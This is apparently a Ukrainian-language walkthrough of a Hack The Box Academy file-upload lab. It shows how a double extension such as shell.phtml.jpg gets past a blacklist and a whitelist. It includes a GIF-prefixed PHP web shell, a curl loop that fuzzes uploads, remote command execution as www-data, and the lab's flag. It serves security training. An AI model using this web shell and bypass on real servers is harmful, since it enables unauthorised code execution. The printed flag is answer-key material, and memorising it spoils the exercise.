## File Uploads — Blacklist + Whitelist Bypass: Double Extension

**Модуль:** [File Upload Attacks](https://academy.hackthebox.com/app/module/136)
**Секція:** [Type Filters](https://academy.hackthebox.com/app/module/136/section/1289)
**Завдання:** Обійти blacklist + whitelist → shell → `/flag.txt`
**Прапор:** `HTB{1_wh173l157_my53lf}`

***

## Концепція

Сервер застосовує **два фільтри**:
1. **Blacklist** — блокує `.php`, `.php5` тощо
2. **Whitelist** — дозволяє лише розширення зображень (`.jpg`, `.png`, `.gif`)

Bypass — **подвійне розширення** `shell.phtml.jpg`:
- Whitelist бачить фінальне `.jpg` → ✅ дозволяє
- Blacklist не знаходить `.php` → ✅ пропускає
- Apache бачить `.phtml` у імені → виконує як PHP

***

## Крок 1 — Підготовка polyglot файлів

```bash
# GIF8 = magic bytes що проходять content-type перевірку
echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.phtml.jpg
echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.phar.jpg
```

***

## Крок 2 — Фаззинг подвійних розширень

```bash
TARGET="http://TARGET_IP:PORT"

for name in "shell.php.jpg" "shell.php.png" "shell.php.gif" \
            "shell.phtml.jpg" "shell.phar.jpg" "shell.php5.jpg" \
            "shell.jpg.php" "shell.png.php" "shell.gif.phtml"; do
  echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/${name}
  RESP=$(curl -s -X POST "$TARGET/upload.php" \
    -F "uploadFile=@/tmp/${name};type=image/gif")
  echo "$name: $RESP"
done
```

**Результат:**

| Файл | Результат |
|---|---|
| `shell.php.jpg` | Extension not allowed (blacklist ловить `.php`) |
| `shell.phtml.jpg` | ✅ File successfully uploaded |
| `shell.phar.jpg` | ✅ File successfully uploaded |
| `shell.gif.phtml` | Only images are allowed (whitelist не бачить image ext) |

***

## Крок 3 — Верифікація RCE

```bash
curl -s "$TARGET/profile_images/shell.phtml.jpg?cmd=id" | grep -o 'uid=[^ <]*'
# uid=33(www-data)

curl -s "$TARGET/profile_images/shell.phar.jpg?cmd=id" | grep -o 'uid=[^ <]*'
# uid=33(www-data)
```

***

## Крок 4 — Прапор

```bash
curl -s "$TARGET/profile_images/shell.phtml.jpg?cmd=cat+/flag.txt"
# GIF8HTB{1_wh173l157_my53lf}
```

> `GIF8` на початку — наші magic bytes з polyglot файлу, не частина прапора.

***

## Логіка фільтрів і чому bypass працює

```
Файл: shell.phtml.jpg

Whitelist перевіряє:  ends with .jpg? → ✅ дозволено
Blacklist перевіряє:  contains .php?  → ❌ не знайшов .php (є .phtml)
Apache обробляє:      shell.phtml.jpg → бачить .phtml → PHP handler → виконує
```

***

## Прапор

```
HTB{1_wh173l157_my53lf}
```
